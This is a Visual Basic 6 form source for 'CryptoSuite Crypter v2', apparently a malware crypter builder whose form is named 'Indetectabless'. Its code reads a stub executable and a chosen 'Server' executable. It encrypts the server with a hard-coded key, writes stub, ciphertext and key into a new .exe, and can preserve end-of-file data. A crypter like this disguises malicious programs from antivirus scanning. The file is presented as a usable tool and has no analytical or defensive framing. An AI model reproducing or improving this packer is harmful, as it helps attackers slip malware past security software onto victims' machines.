VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Indetectabless 
   BackColor       =   &H00000040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CryptoSuite Crypter By CluBdeDuB7"
   ClientHeight    =   1635
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   7170
   FontTransparent =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Indetectables.frx":0000
   ScaleHeight     =   1635
   ScaleWidth      =   7170
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Check1 
      BackColor       =   &H00000000&
      Caption         =   "EOF"
      ForeColor       =   &H000000C0&
      Height          =   255
      Left            =   6360
      TabIndex        =   4
      Top             =   120
      Width           =   735
   End
   Begin VB.CommandButton Command3 
      BackColor       =   &H00FFFFFF&
      Caption         =   "About"
      Height          =   255
      Left            =   1200
      TabIndex        =   3
      Top             =   120
      Width           =   855
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypte"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   975
   End
   Begin MSComDlg.CommonDialog m 
      Left            =   6120
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog f 
      Left            =   5640
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   6240
      TabIndex        =   1
      Top             =   1320
      Width           =   855
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   285
      Left            =   240
      TabIndex        =   0
      Top             =   1320
      Width           =   5895
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Http://CryptoSuite.Org/"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   -1  'True
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   2640
      TabIndex        =   5
      Top             =   0
      Width           =   1935
   End
   Begin VB.Image Image1 
      Height          =   1605
      Left            =   -240
      Picture         =   "Indetectables.frx":5554
      Top             =   0
      Width           =   7500
   End
End
Attribute VB_Name = "Indetectabless"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
With f
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Select a file to crypte!"
.ShowOpen
End With
Text1.Text = f.Filename

End Sub

Private Sub Command2_Click()
If Text1.Text = "" Then
MsgBox "Select a Server!", vbInformation, "CryptoSuite Crypter v2"
Exit Sub
End If
Open App.Path & "\STUB.exe" For Binary As #1
Dim stub As String
stub = Space(LOF(1))
Get #1, , stub
Close #1
Open f.Filename For Binary As #1
Dim fs As String
fs = Space(LOF(1) - 1)
Get #1, , fs
Close #1

If Check1.Value = 1 Then
Dim sv As String
sv = ReadEOFData(f.Filename)
End If

With m
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Guardar archivo.."
.ShowSave
End With

Dim H As New Class1
Open m.Filename For Binary As #1
Put #1, , stub & "!!!!!!!!!!!!!!!=))"
Put #1, , H.EncryptString(fs, "VIVALAMADREDELJOSE;;EEEE") & "!!!!!!!!!!!!!!!=))"
Put #1, , "VIVALAMADREDELJOSE;;EEEE" & "!!!!!!!!!!!!!!!=))"
Close #1


If Check1.Value = 1 Then
Call WriteEOFData(m.Filename, sv)
End If

MsgBox "Crypted!", vbInformation, "CryptoSuite Crypter v2"

End Sub

Private Sub Command3_Click()
MsgBox "Bu Crypter Clubdedub7 Tarafindan Yapilmistir." & vbNewLine & "This Program Is Created By CLubdedub7" & vbNewLine & vbNewLine & "Contact : Clubdedub@hotmail.com , Cryptosuite.Org", vbInformation, "CryptoSuite Crypter V2"
End Sub

Private Sub Label1_Click()
Shell "cmd.exe /c start www.cryptosuite.org", vbHide
End Sub

Private Sub Label2_Click()

End Sub
